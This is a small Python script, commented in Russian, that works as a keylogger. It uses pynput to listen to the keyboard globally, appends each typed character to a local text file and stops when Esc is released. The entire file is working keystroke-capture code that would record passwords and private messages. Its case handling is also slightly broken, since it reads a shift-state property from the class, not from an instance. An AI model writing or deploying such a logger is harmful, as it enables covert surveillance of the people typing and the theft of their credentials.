import pynput
from pynput.keyboard import Listener, Key, Controller


def press(key):
    with open("keyboard/text.txt", "a") as file:
        # Убрать кавычки из записи
        t = (str(key).replace("'", ""))
        # Писать с новой строки при пробелах
        if key == Key.space or key == Key.enter:
            t = '\n'
        # Если не нажата спец.клавиша, то вписывать буквы
        if t.find('Key') == -1:
            if not Controller.shift_pressed:
                t = t.upper()
            else:
                t = t.lower()
            file.write(t)


def release(key):
    if key == Key.esc:
        return False


# Читает клаву
with Listener(on_press=press, on_release=release, ) as listener:
    listener.join()  # подключение чтения
